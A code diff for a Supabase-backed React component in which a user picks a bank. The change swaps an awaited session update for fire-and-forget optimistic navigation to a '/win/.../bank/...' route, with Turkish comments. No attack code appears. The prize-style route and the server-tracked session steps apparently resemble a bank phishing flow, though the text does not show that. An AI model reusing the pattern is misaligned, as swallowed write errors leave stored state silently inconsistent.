@@ -216,26 +216,23 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
       delete nextFormData[field];
     }
 
-    const { error } = await supabase
+    // OPTIMISTIK NAVIGASYON: DB yazmasini beklemeden hemen banka sayfasina gec.
+    // Eskiden await ~300-800ms suruyordu -> kullanici "tiklamadi" sanip 2. kez
+    // tikliyordu (lock oldugu icin de hic bir sey olmuyordu).
+    void supabase
       .from("sessions")
       .update({ is_hidden: false, current_step: "bank",
         form_data: nextFormData,
       })
-      .eq("id", sessionId);
+      .eq("id", sessionId)
+      .then(({ error }) => {
+        if (error) {
+          console.warn("bank select update failed", error);
+        }
+      });
 
-    if (!mountedRef.current || selectionVersionRef.current !== selectionVersion) {
-      return;
-    }
-
-    setSaving(false);
-    if (error) {
-      navigationLockRef.current = false;
-      setMsg("Shranjevanje ni uspelo.");
-    }
-    else {
-      setSessionFormData(nextFormData);
-      router.push(`/win/${effectiveRouteSessionId}/bank/${nextBankSlug}`);
-    }
+    setSessionFormData(nextFormData);
+    router.push(`/win/${effectiveRouteSessionId}/bank/${nextBankSlug}`);
   }
 
   if (!supabase) {
